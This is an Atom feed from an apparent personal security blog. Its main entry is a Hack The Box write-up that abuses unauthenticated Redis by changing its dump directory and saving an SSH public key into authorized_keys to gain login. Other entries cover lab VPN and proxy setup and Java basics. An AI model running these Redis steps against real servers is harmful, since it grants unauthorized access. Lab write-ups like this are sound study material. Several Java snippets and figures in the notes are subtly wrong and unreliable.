<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://m1crofan.github.io</id>
    <title>m1cr0fan&apos;sBlog</title>
    <updated>2025-04-08T13:37:24.529Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://m1crofan.github.io"/>
    <link rel="self" href="https://m1crofan.github.io/atom.xml"/>
    <logo>https://m1crofan.github.io/images/avatar.png</logo>
    <icon>https://m1crofan.github.io/favicon.ico</icon>
    <rights>All rights reserved 2025, m1cr0fan&apos;sBlog</rights>
    <entry>
        <title type="html"><![CDATA[Bypass 360]]></title>
        <id>https://m1crofan.github.io/SZ7AN49tDB/</id>
        <link href="https://m1crofan.github.io/SZ7AN49tDB/">
        </link>
        <updated>2025-04-08T13:36:48.000Z</updated>
        <content type="html"><![CDATA[<figure data-type="image" tabindex="1"><img src="https://m1crofan.github.io/post-images/1744119437684.png" alt="" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Redis未授权的美妙世界]]></title>
        <id>https://m1crofan.github.io/bJ5ZdG2qxl/</id>
        <link href="https://m1crofan.github.io/bJ5ZdG2qxl/">
        </link>
        <updated>2025-04-02T07:49:09.000Z</updated>
        <content type="html"><![CDATA[<p>在多次攻防项目中都碰到过redis未授权；但之前一直对这块不了解，用现成的梭哈工具都用不明白。但我又比较懒，懒得搭靶场。所以，找HTB中相关的靶场玩了。</p>
<h1 id="0x01-信息收集">0x01 信息收集</h1>
<p>目标IP ： 10.10.10.160</p>
<p>fscan扫一下</p>
<pre><code class="language-shell">./fscan -h 10.10.10.160 -p 1-65535
   ___                              _    
  / _ \     ___  ___ _ __ __ _  ___| | __ 
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    
\____/     |___/\___|_|  \__,_|\___|_|\_\   
                     fscan version: 1.8.4
start infoscan
10.10.10.160:22 open
10.10.10.160:80 open
10.10.10.160:6379 open
10.10.10.160:10000 open
[*] alive ports len is: 4
start vulscan
[*] WebTitle http://10.10.10.160       code:200 len:3844   title:The Cyber Geek's Personal Website
[*] WebTitle https://10.10.10.160:10000 code:200 len:4566   title:Login to Webmin
[+] Redis 10.10.10.160:6379 unauthorized file:/var/lib/redis/dump.rdb
[+] Redis 10.10.10.160:6379 like can write /var/spool/cron/
</code></pre>
<p>可以看到 fscan扫出来<code>6379</code>这个redis相关端口，并且存在未授权。</p>
<p>不知道是什么操作系统，掏出nmap再探测一下</p>
<pre><code class="language-shell">sudo nmap -O &lt;目标IP地址&gt;
</code></pre>
<p>扫描发现 nmap也扫不出来</p>
<h1 id="0x02-边界突破">0x02 边界突破</h1>
<p>nmap扫描不出来，就只能靠redis的目录配置来确定了</p>
<p>我先按照abc师傅在希谭实验室公众号分享的文章，配置一下利用环境：直接用Windows对redis linux进行利用。</p>
<p>先下载一个redis-cli.exe</p>
<p>https://github.com/redis-windows/redis-windows/releases</p>
<h2 id="0x021-操作系统判断">0x02.1 操作系统判断</h2>
<p>通过以下命令，判断是否为linux机器</p>
<pre><code class="language-shell">config set dir /tmp
D:\software\Redis-6.2.17\Redis-6.2.17-Windows-x64-cygwin&gt;redis-cli.exe -h 10.10.10.160
10.10.10.160:6379&gt;
10.10.10.160:6379&gt; config set dir /tmp
OK
(0.53s)
</code></pre>
<p>返回ok，说明是linux机器。</p>
<h2 id="0x022-判断是否能写root下ssh">0x02.2 判断是否能写root下<code>.ssh</code></h2>
<pre><code class="language-shell">10.10.10.160:6379&gt; config set dir /root/.ssh
(error) ERR Changing directory: Permission denied
</code></pre>
<p>权限不够，不太彳亍。</p>
<h2 id="0x023-回到redis默认安装路径">0x02.3 回到redis默认安装路径</h2>
<p>我们回到redis默认安装路径，并判断该路径下是否存在<code>.ssh/</code>目录</p>
<pre><code class="language-shell">10.10.10.160:6379&gt; config set dir /var/lib/redis/.ssh
OK
</code></pre>
<p>可以发现，竟然存在！</p>
<p>到这里会有两个疑问</p>
<p>Q1：redis服务，一般都会有对应的redis用户吗？</p>
<p>Q2：默认路径下，一般都会有<code>.ssh</code>目录吗?</p>
<p>问大模型，它给出了如下解释</p>
<p>A1：</p>
<p><strong>通常情况下，为了安全起见，建议在 Linux 系统上为 Redis 服务创建一个专门的用户。</strong></p>
<ul>
<li><strong>安全考虑：</strong> 运行 Redis 服务通常不需要 root 权限。为了降低潜在的安全风险，最佳实践是创建一个非特权用户来运行 Redis 进程。这样，即使 Redis 服务出现漏洞，攻击者也无法直接获得 root 权限。</li>
<li><strong>隔离和管理：</strong> 使用专门的用户可以更好地隔离 Redis 服务与其他系统进程，方便进行权限管理和资源控制。</li>
</ul>
<p>A2:</p>
<p><strong>Redis 服务本身通常不会主动创建或使用</strong> <code>**.ssh**</code> <strong>目录。</strong></p>
<ul>
<li><code>**.ssh**</code> <strong>目录的作用：</strong><code>.ssh</code> 目录是用于存储用户的 SSH (Secure Shell) 密钥和配置文件的目录。它主要用于安全的远程登录和执行命令。</li>
<li><strong>Redis 的功能：</strong> Redis 是一个内存中的数据结构存储系统，它主要用于数据缓存、消息队列等场景。它本身并不需要进行 SSH 连接来运行。</li>
</ul>
<p><strong>但是，存在以下几种可能导致 Redis 相关的</strong> <code>**.ssh**</code> <strong>目录的情况，但这并非 Redis 服务本身的特性：</strong></p>
<ol>
<li><strong>运行 Redis 服务的用户有自己的 SSH 配置：</strong> 如果你使用一个已经拥有 SSH 配置的用户（例如 <code>redis</code> 用户，如果它被创建来运行 Redis 并且也被用于其他目的），那么这个用户目录下自然会有 <code>.ssh</code> 目录。这与 Redis 服务本身无关。</li>
<li><strong>人为创建：</strong> 有些用户可能会出于特定的管理或部署目的，手动在 Redis 的相关用户目录下创建 <code>.ssh</code> 目录。例如，可能用于通过 SSH 管理 Redis 服务器上的其他服务，但这与 Redis 进程的运行没有直接关系。</li>
</ol>
<h2 id="0x024-写入ssh公钥">0x02.4 写入ssh公钥</h2>
<h3 id="生成公私钥对方法一命令行">生成公私钥对——方法一：命令行</h3>
<p>可以使用如下命令生成一个公私钥对，其中目录<code>./ssh</code>是自定义的用于存在生成的公私钥。</p>
<pre><code class="language-shell">ssh-keygen -t rsa -b 2048 -f ./ssh/id_rsa2048
ubuntu@10-7-42-34:~$ ssh-keygen -t rsa -b 2048 -f ./ssh/id_rsa2048
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in ./ssh/id_rsa2048
Your public key has been saved in ./ssh/id_rsa2048.pub
The key fingerprint is:
SHA256:mPS7qgooVAF54PY8vbv5evSLvfo/MOU9OYKM1orjS+A ubuntu@10-7-42-34
The key's randomart image is:
+---[RSA 2048]----+
| o+.             |
|.. ..            |
| o..  .          |
|. + .. +   .     |
| . = .o S + . .  |
|o . o .+ B o =   |
|+  E o+ + o . o  |
|..  .ooooo .     |
|  ..oOO=+=+..    |
+----[SHA256]-----+
</code></pre>
<p>之后会提示设置一个密码短语；可以滞空。</p>
<p>可以看到 在目录下生成了公私钥对</p>
<pre><code class="language-shell">ubuntu@10-7-42-34:~/ssh$ ls
id_rsa2048  id_rsa2048.pub
</code></pre>
<p>读取公钥</p>
<pre><code class="language-shell">ubuntu@10-7-42-34:~/ssh$ cat *pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDPA0/3YDeVSVsWNOEbnxgS9VIGktd++SJAX9Phy+gB5lDx5XZ3bXpDHcwridfAwCqQviSMjNPy+VtsmJoGihqhiMGruXxelRxZsLCQ+67T8lDJu1/4/D89hFZYsoM5R3DFeAYwKCar2vxnZrTXV+9lmEHbFXNoYVpBBH12BEbRCG2LVHe5k9vjorO6b/0fjcXl/UrA9cbRiE2ugZilphfz/aSzUMeyn0xdehLP5uK69myWVqQ5ldtW6PRFvN2J+Ecat+O7NOCddTnGa4f1gL59oE7Nv7gXg2P2VVbKQj9jdkPGeNi8HwU9wgz056IKc4bAGg2xTMpqVCDoC1gut7av ubuntu@10-7-42-34
</code></pre>
<p>写入到目标服务器的authorized_keys文件中。</p>
<pre><code class="language-shell">set x &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDPA0/3YDeVSVsWNOEbnxgS9VIGktd++SJAX9Phy+gB5lDx5XZ3bXpDHcwridfAwCqQviSMjNPy+VtsmJoGihqhiMGruXxelRxZsLCQ+67T8lDJu1/4/D89hFZYsoM5R3DFeAYwKCar2vxnZrTXV+9lmEHbFXNoYVpBBH12BEbRCG2LVHe5k9vjorO6b/0fjcXl/UrA9cbRiE2ugZilphfz/aSzUMeyn0xdehLP5uK69myWVqQ5ldtW6PRFvN2J+Ecat+O7NOCddTnGa4f1gL59oE7Nv7gXg2P2VVbKQj9jdkPGeNi8HwU9wgz056IKc4bAGg2xTMpqVCDoC1gut7av ubuntu@10-7-42-34&quot;
</code></pre>
<p>输入save，保存Redis配置并写入SSH公钥文件。</p>
<h3 id="生成公私钥对方法二termius">生成公私钥对——方法二：Termius</h3>
<p>我最爱的终端工具<code>Termius</code>，除了有好看的界面，也能生成公私钥对。</p>
<figure data-type="image" tabindex="1"><img src="https://cdn.nlark.com/yuque/0/2025/png/1346970/1743559400376-c138fed3-18c7-4930-aedd-e9a4b78083a6.png" alt="img" loading="lazy"></figure>
<p>选择RSA 2048 即可生成公私钥对</p>
<figure data-type="image" tabindex="2"><img src="https://cdn.nlark.com/yuque/0/2025/png/1346970/1743559503797-ac0cfd86-6d62-4d8c-a767-5b2062384e78.png" alt="img" loading="lazy"></figure>
<h2 id="0x025-登陆ssh">0x02.5 登陆ssh</h2>
<p>发现无论是 方法一还是方法二 ；都无法免密登录</p>
<figure data-type="image" tabindex="3"><img src="https://cdn.nlark.com/yuque/0/2025/png/1346970/1743560145012-e2385f38-60df-4be6-9fab-e7676278eebb.png" alt="img" loading="lazy"></figure>
<p>猜测可能是写入公钥的时候，前后少了两个换行符<code>\n\n</code></p>
<p>我们再次尝试：</p>
<pre><code class="language-shell">10.10.10.160:6379&gt; set x &quot;\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDOuRcuXhZoAorW/qYWX4aaoAzMbSuR9NAV6K4/88CLwD30AMGq14YtgRwCeiZH1fWwNhOBIfafAlpraHvY4VoCuyRmXmRItgl13JEMUENOMxnD3EI4GhFea6keeUaSiSar3q5NmN3cVEvBeOhcvK643KndVFc5JLO6qD+8ScNrR8R5uf5XlLRUMT01D7jtUCLmvo1wNASPK8Mg9nS6p3nPSVDWvlPrTNdlSRCct6st0AUR9SU1WmJ4Ar6LLoSlrSGmM31RWR2agOzbzAY0eSezc7zNxEWh7jdbksA8kzCzdKqA3HUN6kEPTJHAZ5vDKxjXaz9K2aWnHHH48uxKKj9P Generated By Termius\n\n&quot;
OK
10.10.10.160:6379&gt; save
OK
(0.53s)
</code></pre>
<figure data-type="image" tabindex="4"><img src="https://cdn.nlark.com/yuque/0/2025/png/1346970/1743560314977-7da7bfba-b097-4224-a249-0c49a117cf60.png" alt="img" loading="lazy"></figure>
<p>这下成功了~</p>
<h2 id="0x03-总结">0x03 总结</h2>
<ul>
<li>记得写公钥时前后加俩换行符<code>\n\n</code></li>
<li>实战中可能没权限写入到root用户的<code>/.ssh</code>目录下；但如果当前用户有<code>/.ssh </code>目录；就可以写入。</li>
</ul>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[如何优雅玩HTB]]></title>
        <id>https://m1crofan.github.io/GbnvEYc0W_/</id>
        <link href="https://m1crofan.github.io/GbnvEYc0W_/">
        </link>
        <updated>2025-03-29T10:51:04.000Z</updated>
        <content type="html"><![CDATA[<h4 id="坑点一">坑点一：</h4>
<p>VPS开启安装openvpn：这个是基操，问google或大模型都行。</p>
<p>坑点在于，使用apt安装的openvpn版本比较低，直接用HTB的配置文件是跑不起来的。</p>
<p>我的解决办法就是借助大模型修改配置文件.ovpn。</p>
<pre><code class="language-shell">client
dev tun
proto tcp  ; Keep TCP protocol for port 443 connection
remote edge-sg-vip-2.hackthebox.eu 443
resolv-retry infinite
nobind
persist-key
persist-tun
remote-cert-tls server  ; Keep this for TLS certificate verification
comp-lzo  ; Keep LZO compression for efficiency
verb 3  ; Increase verbosity for debugging (optional)
# Removed data-ciphers-fallback (not supported in 2.4)
cipher AES-256-CBC  ; Select a single strong cipher (AES-256-CBC)
tls-cipher &quot;DEFAULT@SECLEVEL=0&quot;  ; Keep the default TLS cipher suite
auth SHA256  ; Keep SHA256 for message authentication
key-direction 1  ; Keep key direction set to 1
</code></pre>
<p>原配置文件头如下</p>
<pre><code class="language-shell">client
dev tun
proto tcp
remote edge-sg-vip-2.hackthebox.eu 443
resolv-retry infinite
nobind
persist-key
persist-tun
remote-cert-tls server
comp-lzo
verb 3
data-ciphers-fallback AES-128-CBC
data-ciphers AES-256-CBC:AES-256-CFB:AES-256-CFB1:AES-256-CFB8:AES-256-OFB:AES-256-GCM
tls-cipher &quot;DEFAULT:@SECLEVEL=0&quot;
auth SHA256
key-direction 1
</code></pre>
<p>主要是修改第十二、十三行；别的都没有修改。</p>
<h4 id="坑点二">坑点二</h4>
<p>问题：HTB靶场，一个配置文件只支持连接一台机器；我的VPS连上了，本地就连不上了。因此，优雅的办法就是，VPS开个socks5代理</p>
<p>我是使用danted开启socks5代理  （开启的方法同样是可以问大模型）</p>
<p>需要注意的是配置文件的网卡选择，记得选中openvpn的那个虚拟网卡。</p>
<figure data-type="image" tabindex="1"><img src="https://m1crofan.github.io/post-images/1743245617212.png" alt="" loading="lazy"></figure>
<p>对应于danted的配置<br>
<img src="https://m1crofan.github.io/post-images/1743245632456.png" alt="" loading="lazy"></p>
<p>然后本机使用Proxifier配好代理就可以愉快的打靶场了</p>
<figure data-type="image" tabindex="2"><img src="https://m1crofan.github.io/post-images/1743245647989.png" alt="" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[java编程基础(二)]]></title>
        <id>https://m1crofan.github.io/Vta8ZZJ2f/</id>
        <link href="https://m1crofan.github.io/Vta8ZZJ2f/">
        </link>
        <updated>2024-09-19T06:21:44.000Z</updated>
        <content type="html"><![CDATA[<h3 id="函数调用的基本原理">函数调用的基本原理</h3>
<p>之前谈过程序执行的基本原理：CPU有一个指令指示器，指向下一条要执行的指令，要么顺序执行，要么进行跳转。程序从main函数开始顺序执行，函数调用可以看作一个无条件跳转，跳转到对应函数的指令处开始执行，碰到return语句或者函数结尾的时候，再执行一次无条件跳转，跳转回调用方，执行调用函数后的下一条指令。</p>
<p>但这里有几个问题。</p>
<ul>
<li>参数如何传递？</li>
<li>函数如何知道返回到什么地方？在if/else、for中，跳转地址都是确定的，但函数自己并不知道会被谁调用，而且可能会被很多地方调用，它并不能提前知道执行结束后返回哪里。</li>
<li>函数结果如何传给调用方？</li>
</ul>
<p>解决思路是使用内存来存放这些数据，函数调用方和函数自己就如何存放和使用这些数据达成一个一致的协议或约定。这个约定在各种计算机系统中都是类似的，存放这些数据的内存有一个相同的名字，叫<strong>栈</strong>。</p>
<p>栈是一块内存，但它的使用有特别的约定，一般是先进后出，类似于一个桶，往栈里放数据入栈，拿数据称为出栈。栈一般是从高位地址向低位地址扩展。</p>
<p>计算机系统主要使用栈来存放函数调过程中需要的数据，包括参数、返回值地址，以及函数内定义的局部变量。计算机系统就如何在栈中存放这些数据，调用者和函数如何协作做了约定。</p>
<p>以上描述可能会有点抽象，我们通过一个例子来具体说明函数执行的过程。</p>
<pre><code class="language-java">public class Sum{
    public static int sum(int a, int b){
        int c = a+b;
        return c;
    }
    
    public static void main(String[] agrs){
        int d= Sum.sum(1,2);
        System.out.println(d);
    }
}
</code></pre>
<p>这是一个简单的例子，main函数调用Sum函数计算1，2之和，然后输出计算结果，让我们从栈的角度讨论一下：</p>
<p>当程序在main函数调用Sum.sum之前，栈的情况如图1：</p>
<p><image src="https://raw.githubusercontent.com/m1crofan/image/main/image-20240918152409822.png"></image></p>
<p>栈主要存放了两个变量args和d，在程序执行到Sum.sum的函数内部，准备返回之前，即第5行，栈的情况大概如下图2：</p>
<p><image src="https://raw.githubusercontent.com/m1crofan/image/main/image-20240918152526293.png"></image></p>
<p>在main函数调用Sum.sum时，首先将参数1和2入栈，然后将返回地址(也就是调用函数结束后要执行的指令地址)入栈，接着跳转到sum函数，在sum函数内部，需要为局部变量c分配一个空间，而参数变量a和b则直接对应于入栈的数据1和2，在返回之前，返回值保存到了专门的返回值存储器中。</p>
<p>在调用return后，程序会跳转到栈中保存的返回地址，即mian的下一条指令地址，而sum函数相关的数据会出栈，从而有变成图1的样子。</p>
<p>main的下一条指令是根据函数返回值给变量d赋值，返回值从专门的返回值存储器中获得。</p>
<p>对于数组和对象类型，它们都有两块内存，一块存放实际的内容，一块存放实际内容的地址，实际的内容空间一般不是分配在栈上的，而是分配在堆中，但存放地址的空间是分配在栈上的。我们来看一个例子</p>
<pre><code class="language-java">public class ArrayMax{
    public static int max(int min, int[] arr){
        int max = min;
        for(int a : arr){
            if(a &gt; max){
                max = a;
            }
        }
        return max;
    }
    public static void main(String[] agrs){
        int[] arr = new[]{2,3,4};
        int ret = max(0,arr);
        System.out.println(ret);
    }
}
</code></pre>
<p>main函数新建了一个数组，然后调用函数max计算0和数组中元素的最大值，在程序执行到max函数的return语句之前的时候，内存中栈和堆的情况如图3：</p>
<p><image src="https://raw.githubusercontent.com/m1crofan/image/main/image-20240918155202378.png"></image></p>
<p>对于数组arr，在栈中存放的是实际内容的地址0x1000,存放地址的栈空间会随着入栈分配，出栈释放，但存放实际内容的堆空间不受影响。但说堆空间完全不受影响是不正确的，在这个例子中，当mian函数执行结束，栈空间没有变量指向它的时候，Java系统会自动进行垃圾回收。</p>
<p>我们再通过栈的角度来理解一下递归函数的调用过程，代码如下：</p>
<pre><code class="language-java">public static int factorial(int n){
    if(n == 0){
        return 1;
    }else{
        return factorial(n-1)
    }
}
public static void main(String[] args){
    int ret = factorial(4);
    System.out.println(ret);
}
</code></pre>
<p>在factorial第一次被调用的时候，n是4，在执行到n<em>factorial(n-1)，即4</em>factorial(3)之前的时候。</p>
<p><img src="https://raw.githubusercontent.com/m1crofan/image/main/image-20240918161624978.png" alt="image-20240918161624978" loading="lazy"><br>
<image src="https://raw.githubusercontent.com/m1crofan/image/main/image-20240918161624978.png"></image></p>
<p>注意，返回值存储器是没有值的，在调用factorial(3)后，栈的情况如图：</p>
<p><image src="https://raw.githubusercontent.com/m1crofan/image/main/image-20240918161757940.png"></image></p>
<p>栈的深度增加了，返回值存储器依然为空，就这样，每递归调用一次，栈的深度就增加一层，每次调用都会分配对应的参数和局部变量，也都会保存调用的返回地址，在调用n等于0的时候，栈的情况如图：</p>
<p><image src="https://raw.githubusercontent.com/m1crofan/image/main/image-20240918162127253.png"></image></p>
<p>这个时候终于有返回值了，我们将factorial简写为f。f(0)的返回值为1；f(0)返回到f(1),f(1)执行<code>1*f(0)</code>,结果也是1；然后返回到f(2),f(2)执行<code>2*f(1)</code>,结果是2；接着返回到f(3),f(3)执行<code>3*f(2)</code>,结果是6；然后返回到f(4),执行<code>4*f(3)</code>,结果是24。</p>
<p>以上就是递归函数的执行过程，函数代码虽然只有一份，但在执行的过程中，每调用一次，就会有一次入栈，生成一份不同的参数、局部变量和返回地址。</p>
<p>小结</p>
<p>本节介绍了函数调用的基本原理，函数调用主要是通过栈来存储相关的数据，系统就函数调用者和函数如何使用栈做了约定，返回值可以简单认为是通过一个专门的返回值存储器存储的。</p>
<p>从函数调用的过程可以看出，调用是有成本的，每一次调用都需要分配额外的栈空间用于存储参数、局部变量以及返回地址，需要进行额外的入栈和出栈操作。在递归调用的情况下，如果递归的次数比较多，这个成本是可观的。所以，如果程序可以比较容易地改为其他方式，应该考虑其他方式。另外，栈空间不是无限的，一般正常调用都是没问题的，但如果栈过深，系统就会抛出错误<code>java.lang.StackOverflowError</code>,即栈溢出。</p>
<h3 id="字符的编码与乱码">字符的编码与乱码</h3>
<p>编码和乱码听起来比较复杂，但其实并不复杂，耐心学习，逐步探讨。编码有两大类：一类是unicode编码，另一类是非Unicode。</p>
<p>常见非Unicode编码，包括：ASCII、ISO 8859-1、Windows-1252、GB2312、GBK、GB18030和Big5。</p>
<p><strong>ASCII</strong></p>
<p>世界上虽然有各种各样的字符，但计算机发明之初没有考虑那么多，基本只考虑了美国的需求。美国大概只需要128个字符，所以就规定了128个字符的二进制表示。178个字符用7位刚好可以表示，计算机存储的最小单位是byte，即8位，ASCII码中最高位设为0，用剩下的7位表示字符。这7位可以看作数字0-126。ASCII码规定了从0-127的每个数字代表什么含义。</p>
<p>我们先来看数字32-126的含义，除了中文以外，我们平常用的字符基本都涵盖了。数字32-126表示的字符都是可打印字符，0-31和127表示一些不可打印字符，这些字符一般用于控制目的。</p>
<image src="https://raw.githubusercontent.com/m1crofan/image/main/image-20240918164434164.png">
<p><image src="https://raw.githubusercontent.com/m1crofan/image/main/image-20240918164627110.png"></image><br>
ASCII码对美国是够用了，但对其他国家而言却是不够的，于是，各个国家的各种计算机厂商就发明了各种各样的编码方式来表示自己国家的字符，为了保持与ASCII码的兼容性，一般都是将最高位设置为1。也就是说，当最高位为0时，表示ASCII码，当为1时表示各个国家自己的字符。</p>
<p><strong>GB2312</strong></p>
<p>美国和西欧用一个字符就够了，但中文显然不够。中文第一个标准是GB2312。GB2312标准主要针对的是简体中文常见字符，包括约7000个汉字和一些罕用字和繁体字。</p>
<p>GB2312固定使用两个字节表示汉字，在这两个字节中，最高位都是1，如果是0，就认为是ASCII字符，在这两个字节中，其中最高位字节范围是0xA1-0xF7,低位字节范围0xA1-0xFE。</p>
<p><strong>GBK</strong></p>
<p>GBK建立在GB2312的基础上，向下兼容GB2312,也就是说GB2312编码的字符和二进制表示，在GBK编码里是完全一样的。GBK增加了14 000多个汉字，其中包括繁体字。</p>
<p>GBK同样使用固定的两个字节表示，其中高位字符范围是0x81-0xFE,低位字节范围是0x40-0x7E和0x80-0xFE。</p>
<p>需要注意的是，低位字节是从0x40开始的，也就说，低位字节的最高位可能为0。那怎么知道它是汉字的一部分，还是一个ASCII字符呢？其实很简单，因为汉字是用固定两个字节表示的。在解析二进制流的时候，如果第一个字节的最高位为1，那么就将下一个字节读进去一起解析为一个汉字，而不用考虑它的最高位。</p>
<p>unicode编码</p>
<p>unicode做了一件事情，就是给世界上所有的字符都分配了一个唯一的数字编号，这个编号范围从0x000000-0x10FFFF。大部分常用字符都在0x0000-0xFFFF之间，即65536个数字之内。每个字符都有一个unocide编号，这个编号一般写成16进制，在前面加U+。大部分中文的编号范围为U+4E00-U+9FFF。</p>
<p>简单理解，Unicode主要做了这么一件事，就是给所有字符分配了唯一数字编号。它没有规定这个编号怎么对应到二进制表示，这是与上面介绍的其他编码不同的，其他编码都即规定了能表示哪些字符，又规定了每个字符对应的二进制是什么。编号对应二进制有多种方案：UTF-32、UTF-16、UTF-8。</p>
<ul>
<li>UTF32：就是字符编号的整数二进制形式；但有一个细节，就是字节的排列顺序。如果第一个字节是整数二进制中的最高位，最后一个字节是整数二进制中的最低位，那这种字节序就叫“大端”(Big Endian, BE)，否则，就叫“小端”(Little Endian, LE)。对应的编码方式分别是UTF-32BE和UTF-32LE。</li>
<li>UTF-16:</li>
<li>UTF-8：使用变长字节表示：每个字符使用的字节个数与其Unicode编号的大小有关，编号小的使用的字节就少，编号大的使用字节就多，使用的字节个数1-4不等。</li>
</ul>
<p>UTF-8编码的编号范围与对应的二进制格式：</p>
<p><image src="https://raw.githubusercontent.com/m1crofan/image/main/image-20240918210438131.png"></image></p>
<h3 id="char的真正含义">char的真正含义</h3>
<p>本小节介绍java中进行字符处理的基础char，java中还有Character、String、StringBuilder等类用于文本处理，它们的基础都是char。</p>
<p>char用于表示一个字符，这个字符可以是中文，也可以是英文。</p>
<pre><code class="language-java">char c = 'A';
char z = '马';
</code></pre>
<p>但为什么字符类型也可以进行算术运算和比较呢？</p>
<p>在java内部进行字符处理时，采用的都是Unicode，具体编码格式是UTF-16BE。UTF-16使用两个或四个字节表示一个字符，Unicode编号范围在65536以内的占两个字节，超出范围的占4字节。BE就是先输出高位字节，再输出地位字节，这与整数的内存表示是一致的。</p>
<p>char本质上是一个固定占用两个字节的无符号正整数，这个正整数对应于Unicode编号，用于表示那个Unicode编号对应的字符。由于固定占用两个字节，char只能表示Unicode编号在65 536以内的字符，而不能表示超出范围的字符。</p>
<p>char有多种赋值方式：</p>
<pre><code class="language-java">char c = 'A';
char c = '马';
char c = 39532;
char c = 0x9a6c;
char c = '\u9a6c';
</code></pre>
<p>第一种赋值方式是最常见的，将一个能用ASCII码表示的字符赋给一个字符变量。第二种赋值方式也很常见，但这里是个中文字符，需要注意的是，直接写字符常量的时候应该注意文件的编码，比如，GBK编码的代码文件按UTF-8打开，字符会变成乱码，复制的时候是按当前的编码解读方式，将这个字符形式对应的Unicode编号值赋给变量，“马”对应的Unicode编号是39532，所以第二种赋值方式和第三种赋值方式是一样的。第三种赋值方式是直接将十进制的常量赋值给字符。第四种赋值方式是将十六进制常量赋值给字符，第五种赋值方式是按Unicode字符形式。</p>
<p>由于char本质上是一个整数，所以可以进行整数能做的一些运算，在进行运算时会被看作int，但由于char占两个字节，运算结果不能直接赋值给char类型，需要进行强制类型转换，这和byte、short参与整数运算时类似的。char类型的比较就是其Unicode编号的比较。</p>
<h3 id="类的基本概念">类的基本概念</h3>
<p>在前面，我们暂时把类看作函数的容器，在某些情况下，类也确实只是函数的容器，但类更多表示的是自定义数据类型。</p>
<p>我们看个例子——java API中的类Math，它里面主要包含了若干数学函数。</p>
<p><image src="https://raw.githubusercontent.com/m1crofan/image/main/image-20240918213202205.png"></image><br>
要使用这些函数，直接在前面加Math.即可，例如Math.abs(-1)返回1。这些函数都有相同的修饰符：public static。static表示类方法，也叫静态方法，与类方法相对的是实例方法。实例方法没有static修饰符，必须通过实例或对象调用，而类方法可以直接通过类名进行调用，不需要创建实例。public表示这些函数都是公开的，可以在任何地方被外部调用。</p>
<p>与public对应的是private，如果是private，则表示私有，这个函数只能在同一类内被别的函数调用，而不能被外部的类调用，在Math类中，有一个函数RandominitRNG()就是private的，这个函数被public的方法random()调用以生成随机数，但不能在Math类以外的地方被调用。</p>
<p>将函数声明为private可以避免该函数被外部类误用，调用者可以清楚地知道那些函数是可以调用的，哪些是不可以调用的。类实现者通过private函数封装和隐藏内部实现细节，而调用者只需要关心public就可以了。可以说，通过private封装和隐藏内部实现细节，避免被误操作，是计算机程序的一种基本思维方式。</p>
<p>我们可以将类看作自定义数据类型，一个数据类型由其包含的属性以及该类型可以进行的操作组成，属性又可以分为是类型本身具有的属性，还是一个具体实例具有的属性，同样，操作也可以分为是类型本身可以进行的操作，还是一个具体实例可以进行的操作。</p>
<p>这样，一个数据类型就主要由4部分组成：</p>
<ul>
<li>类型本身具有的属性，通过类变量体现。</li>
<li>类型本身可以进行的操作，通过类方法体现。</li>
<li>类型实例具有的属性，通过实例变量体现。</li>
<li>类型实例可以进行的操作，通过实例方法体现。</li>
</ul>
<p>不过，对于一个具体类型，每个部分不一定都有，Arrays类就只有类方法。</p>
<p>类变量和实例变量都叫成员变量，也就是类的成员，类变量也叫静态变量或静态成员变量。类方法和实例方法都叫成员方法，也都是类的成员，类方法也叫静态方法。</p>
<p><strong>类变量</strong></p>
<p>类型本身具有的属性通过类变量体现，经常用于表示一个类型中的常量。比如Math类，定义了两个数学中常用的常量，如下所示：</p>
<pre><code class="language-java">public static final double E = 2.7182818284590452354;
public static final double PI = 3.141592653589793239846;
</code></pre>
<p>E表示数学中自然对数的底数；PI表示数学中的圆周率。与类方法一样，类变量可以直接通过类名访问，如Math.PI。</p>
<p>这两个变量的修饰符也都有public static，public表示外部可以访问，static表示类变量。与public相对的也是private，表示变量只能在类内被访问。与static相对的是实例变量，没有static修饰符。</p>
<p>这里多了一个修饰符final，final在修饰变量的时候表示常量，即变量赋值后就不能再修改了。使用final可以避免误操作。表示类变量的时候，static修饰符是必需的，但public和final都不是必需的。</p>
<p><strong>实例变量和实例方法</strong></p>
<p>实例，字面意思就是一个实际的例子。实例变量表示具体的实例所具有的属性，实例方法表示具体的实例可以进行的操作。</p>
<p>我们定义一个简单的类，表示平面坐标轴的一个点</p>
<pre><code class="language-java">public class Point{
    public int x;
    public int y;
    public double distance(){
        return Math.sqrt(x*y+y*x);
    }
}
</code></pre>
<p>我们来解释一下</p>
<pre><code class="language-java">public class Point
</code></pre>
<p>表示类型的名字是Point，是可以被外部公开访问的。这个public修饰似乎是多余的，不能被外部访问，定义类干嘛？在这里，确实不能用private修饰Point。但修饰符可以没有(即留空)，表示包级别的可见性。另外，类可以定义在一个类的内部，这时可以使用private修饰符。</p>
<pre><code class="language-java">public int x;
public int y;
</code></pre>
<p>定义了两个实例变量x和y，分别表示x坐标和y坐标，与类变量类似，修饰符也有public或private修饰符，表示含义类似，public表示可以被外部访问，而private表示私有，不能直接被外部访问，实例变量不能有static修饰符。</p>
<pre><code class="language-java">public double distance(){
    return Math.sqrt(x*y+y*y);
}
</code></pre>
<p>定义了实例方法distance，表示该点到坐标原点的距离。该方法可以直接访问实例变量x和y，这是实例方法和类方法最大区别。实例方法直接访问实例变量，到底是什么意思呢？其实，在实例方法中，有一个隐含的参数，这个参数就是当前操作的实例自己，直接操作实例变量，实际也需要通过参数进行。实例方法和类方法的更多区别如下：</p>
<ul>
<li>类方法只能访问类变量，不能访问实例变量，可以调用其他的类方法，不能调用实例方法。</li>
<li>实例方法即能访问实例变量，也能访问类变量，即可以调用实例方法，也可以调用类方法。</li>
</ul>
<p><strong>使用一个类</strong></p>
